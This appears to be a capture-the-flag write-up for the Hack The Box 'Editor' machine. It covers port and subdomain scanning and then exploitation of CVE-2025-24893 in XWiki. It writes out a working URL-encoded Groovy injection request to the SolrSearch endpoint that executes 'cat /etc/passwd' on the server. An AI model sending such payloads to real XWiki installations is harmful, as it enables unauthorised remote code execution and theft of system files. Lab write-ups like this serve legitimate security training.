![[Editor-00.png]]

Add `editor.htb` to /etc/hosts

```bash
echo "10.10.11.80 editor.htb" >> /etc/hosts
```

## Network Scan

### Rustscan

```bash
rustscan -a editor.htb > rustscan.txt
```

Output

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.80:22
Open 10.10.11.80:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 12:49 UTC
Initiating Ping Scan at 12:49
Scanning 10.10.11.80 [4 ports]
Completed Ping Scan at 12:49, 0.36s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:49
Scanning editor.htb (10.10.11.80) [2 ports]
Discovered open port 80/tcp on 10.10.11.80
Discovered open port 22/tcp on 10.10.11.80
Completed SYN Stealth Scan at 12:49, 0.69s elapsed (2 total ports)
Nmap scan report for editor.htb (10.10.11.80)
Host is up, received echo-reply ttl 62 (0.39s latency).
Scanned at 2025-08-03 12:49:44 UTC for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
           Raw packets sent: 6 (240B) | Rcvd: 11 (436B)
```

We got only `ssh` and `http` port open so lets head straight to web enumeration

## Web Enumeration

Upon opening the website in the browser we can see that it is a code editor.

![[Editor-01.png]]
Nothing much on the website only 2 binaries for windows and debian lets Download and inspect them.

After inspecting using ghidra i didnt find anything useful(maybe i am wrong) but moving forward i ran a subdomain enumeration.

### FFuF

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.editor.htb" -u http://editor.htb -fw 4
```
	ffuf : the fuzzing tool
	-w : Wordlist 
	-H : header for enumeration 
	-u : url
		-fw : using word filter for all the values consisting 4 for sorting false positives

Output
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.editor.htb" -u http://editor.htb -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editor.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.editor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

wiki                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 511ms]

```

We found a wiki subdomain lets add it to `/etc/hosts` 

```bash
echo "10.10.11.80 wiki.editor.htb" >> /etc/hosts
```

After opening it in the browser we can that it is a `Xwiki` website

![[Editor-02.png]]
It is an Open Source wiki software commonly used for Documentation.

Reading the contents we can confirm it is the documentation for Code editor we found on the parent domain.

On the bottom of the page we can see the version for the Xwiki running.

|     ![[Editor-03.png]]     |
| :------------------------: |
| ***XWiki Debian 15.10.8*** |

Now a simple search for the version showed us that there is a known CVE for xwiki for platform version 15.10.10 [CVE-2025-24893](https://www.exploit-db.com/exploits/52136)

### CVE-2025-24893
Since the version wiki.editor.htb is running is lower we can try to exploit it using the above exploit.
I tried using the exploit but it has many errors so i switched to github and used it and it was not detecting if the website was vulnerable or not

![[Editor-04.png]]

So what i did copy pasted the exploit manually on from the exploit db

```http
/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

and mixed with my url the final payload becomes

```http
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

The payload downloaded the output in a Solrsearch file which consists of `/etc/passwd`

![[Editor-05.png]]
